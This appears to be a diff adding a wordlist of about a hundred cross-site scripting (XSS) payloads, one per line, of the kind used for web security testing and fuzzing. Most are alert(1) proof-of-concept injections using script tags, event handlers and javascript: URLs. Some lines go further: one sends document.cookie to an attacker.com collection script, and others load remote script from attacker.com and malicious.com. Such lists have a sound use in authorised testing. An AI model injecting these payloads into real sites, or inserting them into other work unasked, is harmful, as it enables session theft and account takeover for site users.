@@ -1,0 +1,100 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+"><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<img src=1 onerror=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert(1)"></iframe>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<marquee onstart=alert(1)>XSS</marquee>
+<input autofocus onfocus=alert(1)>
+<a href="javascript:alert(1)">Click me</a>
+"><img src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>XSS</details>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<link rel="stylesheet" href="javascript:alert(1)">
+<style onload=alert(1)>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<input type="text" value="XSS" onfocus="alert(1)">
+<input type="hidden" value="XSS" onfocus="alert(1)">
+<button onclick="alert(1)">Click me</button>
+<div style="background-image:url(javascript:alert(1))">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<img src=xss onerror=alert(1)>
+"><iframe src="javascript:alert(1)"></iframe>
+"><svg><script>alert(1)</script></svg>
+"><img src=x onerror=alert('XSS')>
+<img src="javascript:alert(1)">
+<input type="image" src="x" onerror="alert(1)">
+<img src=x onerror="alert('XSS')">
+<a href=javascript:alert(1)>Click</a>
+<script>confirm(1)</script>
+<script>console.log(document.cookie)</script>
+"><img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+"><svg><script>alert('XSS')</script></svg>
+<input onblur="alert(1)">
+<form onsubmit="alert(1)">
+<script>alert(document.domain)</script>
+<script>alert(document.URL)</script>
+javascript:alert(1)
+<script src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe onload="alert(1)">
+<div onmouseover="alert(1)">XSS</div>
+<button onfocus="alert(1)">XSS</button>
+<meta charset="x-imap3;">
+<img src=x:alert(1)>
+<img src=xss onerror="alert(1)">
+<style><script>alert(1)</script></style>
+<base href="javascript:alert(1)">
+<bgsound src="javascript:alert(1)">
+<input type="image" src="javascript:alert(1)">
+<input value="XSS" onmouseover="alert(1)">
+<textarea onfocus="alert(1)">XSS</textarea>
+<script>alert(document.referrer)</script>
+<script src="http://attacker.com/xss.js"></script>
+<img src="x" onerror="alert('XSS')">
+<script>window.location='http://attacker.com/cookie.php?c='+document.cookie</script>
+<div onmouseenter="alert(1)">XSS</div>
+<svg/onload="alert(1)">
+<iframe src="data:text/html,<script>alert(1)</script>">
+<math><mtext></mtext><script>alert(1)</script></math>
+<script>alert(window.name)</script>
+<script>alert(navigator.userAgent)</script>
+<img src="javascript:alert(1)">
+<script src="https://malicious.com"></script>
+"><svg/onload=alert(1)>
+"><script>alert(document.cookie)</script>
+<div style="background:url(javascript:alert(1))">
+<audio autoplay src=x onerror=alert(1)>
+<img src="#" onerror="alert('XSS')">
+"><input onfocus=alert(1)>
+<span onclick="alert(1)">XSS</span>
+<div draggable="true" ondragstart="alert(1)">Drag me</div>
+<button onmouseover="alert(1)">Hover me</button>
+<img srcset="javascript:alert(1)">
+<div contenteditable="true" oninput="alert(1)">Editable</div>
+<img src="x" onerror="alert(1)">
+<script>alert(top.location)</script>
+<script>alert(window.frames)</script>
+<form><button formaction="javascript:alert(1)">Click</button></form>
+<img src=x onerror=prompt(1)>
+<input onblur="alert(document.cookie)">
+<script>alert(document.forms[0])</script>
+<video onloadstart="alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<svg/onmouseover="alert(1)">
+<iframe onload="alert('XSS')">
+<img src="x" onerror="alert(1)">
+<input type="text" value="XSS" onfocus="alert('XSS')">
+<form onsubmit="alert('XSS')">
+<object onerror="alert(1)">
+<img src="x" onerror="alert(1)">
+<iframe onload="alert(1)">
+<img src="x" onerror="alert('XSS')">
